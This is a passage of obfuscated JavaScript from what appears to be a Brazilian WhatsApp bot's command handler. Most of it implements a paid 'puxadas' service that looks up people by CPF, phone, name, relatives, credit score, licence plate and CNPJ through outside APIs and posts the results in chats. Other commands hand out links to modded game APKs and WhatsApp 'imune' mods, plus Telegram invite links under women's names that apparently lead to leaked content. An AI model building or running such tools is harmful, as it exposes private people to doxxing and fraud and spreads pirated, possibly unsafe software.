                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0xbd5e51, _0x51ff10).catch(_0x3797e1 => {
                    return _0x403602("" + infoerror);
                  });
                } else {
                  _0x403602("Marque uma imagem...!");
                }
              } catch (_0x2dd48e) {
                return _0x403602("ERROR!!");
              }
              break;
            case "convite":
              if (!_0xf87dd3.includes("chat.whatsapp.com")) {
                return _0x403602("Cadê o link do grupo que você deseja que eu entre?");
              }
              cnvt = _0x40e45c.join(" ");
              _0x403602("O convite para o bot entrar em seu grupo, foi enviado, espere o dono aceitar..");
              EnvBotao(_0x3a52d1, "✔️ Convite para entrar em um Grupo\n\nLink : " + cnvt + "\n\nNúmero dele(a) : wa.me/" + _0x32e455.split("@")[0], "☂️", "1|0", [_0x1d93be + "entrar " + cnvt, "Aceitar", _0x1d93be + "recusar " + _0x32e455, "Recusar"], _0xa6b34);
              break;
            case "recusar":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              _0x263319.sendMessage(_0x1d6557, {
                text: "Olá Amigo(a), sinto muito dizer, mas seu convite foi recusado 🥺"
              });
              break;
            case "join":
            case "entrar":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              string = _0x40e45c.join(" ");
              if (!string) {
                return _0x403602("Insira um link de convite ao lado do comando.");
              }
              if (string.includes("chat.whatsapp.com/") || _0x403602("Ops, verifique o link que você inseriu.")) {
                _0x2722a9 = string.split("app.com/")[1];
                try {
                  _0x263319.groupAcceptInvite("" + _0x2722a9);
                } catch (_0x36be5b) {
                  if (String(_0x36be5b).includes("resource-limit")) {
                    _0x403602("O grupo já está com o alcance de 257 membros.");
                  }
                  if (String(_0x36be5b).includes("not-authorized")) {
                    _0x403602("Não foi possível entrar no grupo.\nMotivo: Banimento.");
                  }
                }
              }
              break;
            case "placa2":
              _0x403602("*CONSULTANDO PLACA: " + _0x1d6557 + " 🔍*");
              try {
                havity = await fetchJson("https://api.bronxyshost.com.br:3048/consulta/placa/" + _0x1d6557 + "?person=pessoa1&token=token1");
                const _0x357b2f = {
                  image: {
                    url: "https://telegra.ph/file/47b57c24cc3209b6e4d35.jpg"
                  },
                  caption: havity.resultado
                };
                const _0x9fac71 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x357b2f, _0x9fac71);
              } catch (_0x1b4c5b) {
                enviar("*" + _0x3dec88 + " NÃO ENCONTRADO [🔎]*");
              }
              break;
            case "only1":
              only1 = "\nLuiz russo (mansão maromba)\n⌠🔮⌡> https://t.me/+8cJ7yGnq5fI2YjYx\n";
              const _0x2d9f07 = {
                text: only1
              };
              const _0x483827 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, _0x2d9f07, _0x483827);
              break;
            case "only2":
              only2 = "\nLuiza blue \n⌠🔮⌡> https://t.me/+JaX8wY_45843ZTBh\n";
              const _0xee47bd = {
                text: only2
              };
              const _0x3dbec9 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, _0xee47bd, _0x3dbec9);
              break;
            case "only3":
              only3 = "\nIsadora vale \n⌠🔮⌡> https://t.me/+smb4i0bxRl41ZjRh\n";
              const _0x47e971 = {
                text: only3
              };
              const _0x77fd3d = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, _0x47e971, _0x77fd3d);
              break;
            case "only4":
              only4 = "\nIngrid bianchi\n⌠🔮⌡> https://t.me/+RJtf2TqTQ8NjZjlh\n";
              const _0x447656 = {
                text: only4
              };
              const _0x59e1ff = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, _0x447656, _0x59e1ff);
              break;
            case "only5":
              only5 = "\nLizy Donato \n⌠🔮⌡> https://t.me/+gmSjm2WZnb41OGEx\n";
              const _0x4b7659 = {
                text: only5
              };
              const _0x3fa575 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, _0x4b7659, _0x3fa575);
              break;
            case "only6":
              only6 = " \nFeh Galvão\n⌠🔮⌡> https://t.me/+naeQ1pp8ajswMjgx\n";
              const _0x2a92ab = {
                text: only6
              };
              const _0x17fd8a = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, _0x2a92ab, _0x17fd8a);
              break;
            case "only7":
              only7 = "\nTatyzack\n⌠🔮⌡> https://t.me/+NvglGFhOLSY5NmZ\n";
              const _0xf955fe = {
                text: only7
              };
              const _0x460862 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, _0xf955fe, _0x460862);
              break;
            case "only8":
              only8 = "\nAyrla Souza \n⌠🔮⌡> https://t.me/+XLziPd47MWo2N2Y\n";
              const _0x5db561 = {
                text: only8
              };
              const _0x29449b = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, _0x5db561, _0x29449b);
              break;
            case "only9":
              only9 = "\nALINE FARIA\n⌠🔮⌡> https://t.me/+j1xp_hmXrx5lZWMx\n";
              const _0x15671e = {
                text: only9
              };
              const _0x49fac0 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, _0x15671e, _0x49fac0);
              break;
            case "only10":
              only10 = "\nKINE CHAN \n⌠🔮⌡> https://t.me/+YIVax4IQ9aFlMDgx\n";
              const _0x1c83b2 = {
                text: only10
              };
              const _0x1c49d0 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, _0x1c83b2, _0x1c49d0);
              break;
            case "only11":
              only11 = "\nDJ NATHI\n⌠🔮⌡> https://t.me/+6Z5vuVApT-1lYjEx\n";
              const _0x2641ee = {
                text: only11
              };
              const _0x4d7c47 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, _0x2641ee, _0x4d7c47);
              break;
            case "only12":
              only12 = "\nBELE KAFFER\n⌠🔮⌡> https://t.me/+70DMw3iTzb0yMzEx\n";
              const _0x5116e5 = {
                text: only12
              };
              const _0x3aed26 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, _0x5116e5, _0x3aed26);
              break;
            case "minecraft":
              _0x403602("MINECRAFT\n\nVERSÃO: 1.20.81.01\n\nhttps://www.mediafire.com/file/avb7vf3xwxie94r/minecraft-mod_1.20.81.01-an1.com.apk/file");
              break;
            case "motox3m":
              _0x403602("https://www.mediafire.com/file/p68z6uud6ngyygv/com.mod.moto.x3m.bike.race.game.mod.apk.1.14.251.14.25.apk/file");
              break;
            case "zombitsunami":
              _0x403602("https://www.mediafire.com/file/36wfa1hz1yhx4nz/Zombie_Tsunami_4.0.5-mod.apk/file");
              break;
            case "vector1":
              _0x403602("https://www.mediafire.com/file/34g8xu39lybyr3v/Vector_Full_1.1.0_1000007.apk/file");
              break;
            case "vector2":
              _0x403602("https://www.mediafire.com/file/hcauxrla5fdvkxa/Vector-2-MOD(RDfantasma).apk/file");
              break;
            case "subway":
              _0x403602("https://www.mediafire.com/file/pil0av6jctsmpvr/Subway_by_Pil_B.apk/file");
              break;
            case "privpri":
              _0x403602("https://www.mediafire.com/file/n0u9fpagzxk6qcu/%25EF%25BD%25A2_%25F0%259D%2596%25B3%25F0%259D%2597%2581%25F0%259D%2596%25BE_%25F0%259D%2596%25AF%25F0%259D%2597%258B%25F0%259D%2597%2582%25F0%259D%2597%258F%25F0%259D%2596%25BA%25F0%259D%2597%258D%25F0%259D%2596%25BE%2527%25F0%259D%2597%258C_%25F0%259D%2596%25A8%25F0%259D%2596%25A8_%25EF%25BD%25A3_-_%2528roxo%2529.apk/file");
              break;
            case "privsec":
              _0x403602("https://www.mediafire.com/file/2ti8r1qacjngrt4/%25EF%25BD%25A2_%25F0%259D%2596%25B3%25F0%259D%2597%2581%25F0%259D%2596%25BE_%25F0%259D%2596%25AF%25F0%259D%2597%258B%25F0%259D%2597%2582%25F0%259D%2597%258F%25F0%259D%2596%25BA%25F0%259D%2597%258D%25F0%259D%2596%25BE%2527%25F0%259D%2597%258C_%25F0%259D%2596%25A8%25F0%259D%2596%25A8_%25EF%25BD%25A3_-_%2528roxo%2529_Secund%25C3%25A1rio.apk/file");
              break;
            case "darkpri":
              _0x403602("esse imune esta desataulizado, em breve atualizaçoes...");
              break;
            case "dinpria":
              _0x403602("https://www.mediafire.com/file/ru4annpdnl4k4g0/Din_Collab_v3_azul_Primario.apk/file");
              break;
            case "dinseca":
              _0x403602("https://www.mediafire.com/file/ru4annpdnl4k4g0/Din_Collab_v3_azul_Primario.apk/file");
              break;
            case "dinprib":
              _0x403602("https://www.mediafire.com/file/4c48p4znb3z8rzu/Din_Collab_v3_Branco_Primario.apk/file");
              break;
            case "dinsecb":
              _0x403602("https://www.mediafire.com/file/n50xc89wvvkntqb/Din_Collab_v3_Branco_Secund%25C3%25A1rio.apk/file");
              break;
            case "darkprir":
              _0x403602("https://www.mediafire.com/file/sg8he3aq7kkf084/Din_Collab_v3_Roxo_Primario.apk/file");
              break;
            case "darksecr":
              _0x403602("https://www.mediafire.com/file/0u7gdqw8nriq85y/Din_Collab_v3_Roxo_Secund%25C3%25A1rio.apk/file");
              break;
            case "dinprivv":
              _0x403602("https://www.mediafire.com/file/xhmj0ypz9cjbb56/Din_Collab_v3_Vermelho_Primario.apk/file");
              break;
            case "dinsecv":
              _0x403602("https://www.mediafire.com/file/0k28prddwzcuqvs/Din_Collab_v3_Vermelho_Secund%25C3%25A1rio.apk/file");
              break;
            case "sn":
              if (!_0x1d6557) {
                return _0x403602("oq deseja ? Ex: " + (_0x1d93be + _0x3dec88) + " xbot e o melhor?");
              }
              const _0x2c2c53 = ["sim", "não", "definitivamente sim", "com certeza nao", "definitivamente não", "com certeza sim"];
              gosto = _0x2e320b.slice(3);
              const _0x55882f = _0x2c2c53[Math.floor(Math.random() * _0x2c2c53.length)];
              hasil = gosto + "\n\nPelos meus calculos: " + _0x55882f;
              _0x403602(hasil);
              break;
            case "imunes":
              _0x403602("desatualizados!");
              break;
            case "cpf":
            case "cpf1":
            case "cpf2":
            case "cpf3":
            case "cpf4":
            case "cpf5":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar, ex: " + (_0x1d93be + _0x3dec88) + " 27867260854");
                }
                if (/\s|\.|-/.test(_0x1d6557)) {
                  _0x403602("Formato inválido! O CPF não pode conter caracteres especiais como pontos e traços ou espaços.");
                } else if (_0x1d6557.length !== 11) {
                  _0x403602("Formato inválido! O CPF precisa ter 11 dígitos.");
                } else {}
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x18e0a2 = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0xa17b43 = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x18e0a2, _0xa17b43);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x15ebb0 = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x15ebb0);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x44edb6 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x44edb6);
                }
              } catch (_0x174212) {
                console.log(_0x174212);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "tel1":
            case "tel2":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar, ex: " + (_0x1d93be + _0x3dec88) + " 32999240466");
                }
                if (/[\s\-\@\+\(\)]/.test(_0x1d6557)) {
                  _0x403602("Formato inválido! O Telefone não pode conter caracteres especiais como traços, espaços, + ou ()\n\nEx: " + (_0x1d93be + _0x3dec88) + " 32999240466");
                } else {}
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x287511 = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x104fce = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x287511, _0x104fce);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x4170e0 = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x4170e0);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x115a9f = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x115a9f);
                }
              } catch (_0x50fd14) {
                console.log(_0x50fd14);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "telfixo":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar, ex: " + _0x1d93be + "telfixo 40028922");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x1d491d = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x461823 = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x1d491d, _0x461823);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/telefonefixo?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x56a75d = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x56a75d);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x51652f = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x51652f);
                }
              } catch (_0x2d6d00) {
                console.log(_0x2d6d00);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "score":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar, ex: " + _0x1d93be + "score 05266278358");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x9a465d = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x47a83e = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x9a465d, _0x47a83e);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x1d988c = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x1d988c);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x19da0d = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x19da0d);
                }
              } catch (_0xc88b0c) {
                console.log(_0xc88b0c);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "parentes":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar, ex: " + _0x1d93be + "parentes 27867260854");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x4685d9 = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x161a3b = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x4685d9, _0x161a3b);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x49f190 = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x49f190);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x18f0b5 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviado em seu privado.\n\n\n🐎 BOT X-BOT - PUXADAS\n\n\n✅ CONSULTA REALIZADA ✅"
                  }, _0x18f0b5);
                }
              } catch (_0x5a0fe3) {
                console.log(_0x5a0fe3);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "nome":
            case "nome2":
            case "nome3":
            case "nome4":
            case "nome5":
              if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou, se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
              }
              if (!_0xd20756 && !_0x38b1b5) {
                return _0x403602("Este comando só deve ser utilizado em Grupos ou por Usuários Vips!");
              }
              if (!_0x1d6557) {
                return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "foto-to 11530802148");
              }
              if (!_0x27b8b3) {
                return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
              }
              const _0x1aa585 = {
                text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
              };
              const _0xe7f1ff = {
                quoted: _0x302296
              };
              var {
                key: _0x3808b5
              } = await _0x263319.sendMessage(_0x4f1071, _0x1aa585, _0xe7f1ff);
              try {
                let _0x4db857 = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + _0x1d6557 + "&apikey=" + _0x512d5e);
                if (!_0x4db857 || !_0x4db857.resultado) {
                  return _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
                }
                let _0x50ac3e = _0x4db857.resultado;
                let _0x3c046d = 0;
                if (_0x4db857.message) {
                  let _0x5383d5 = _0x4db857.message.match(/total de resultados: (\d+)/);
                  _0x3c046d = _0x5383d5 ? parseInt(_0x5383d5[1], 10) : 0;
                }
                if (_0x3c046d > 50) {
                  const _0x5423c8 = require("fs");
                  const _0x10cd97 = require("path");
                  const _0x2b7c9f = "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + _0x50ac3e + "\n\n• 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc;
                  const _0x578d66 = _0x1d6557 + ".txt";
                  const _0x302a0f = _0x10cd97.join(__dirname, _0x578d66);
                  _0x5423c8.writeFileSync(_0x302a0f, _0x2b7c9f, "utf-8");
                  const _0x5ecfe3 = {
                    url: _0x302a0f
                  };
                  const _0x284507 = {
                    document: _0x5ecfe3,
                    mimetype: "text/plain",
                    fileName: _0x578d66,
                    caption: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n• *TOTAL DE RESULTADOS: " + _0x3c046d + "*\n\n• 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc
                  };
                  const _0x20f216 = {
                    quoted: _0x302296
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x284507, _0x20f216);
                  _0x5423c8.unlinkSync(_0x302a0f);
                } else {
                  const _0x4d63c3 = {
                    text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + _0x50ac3e + "\n\n• 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                    edit: _0x3808b5
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x4d63c3);
                }
              } catch (_0x319018) {
                const _0x3dedf6 = {
                  text: "⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️",
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x3dedf6);
                console.error(_0x319018);
              }
              break;
            case "cnpj":
            case "cnpj2":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar, ex: " + _0x1d93be + "cnpj 08174089000114");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x495dfc = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x35cf9f = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x495dfc, _0x35cf9f);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x234abe = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x234abe);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x16ddf7 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
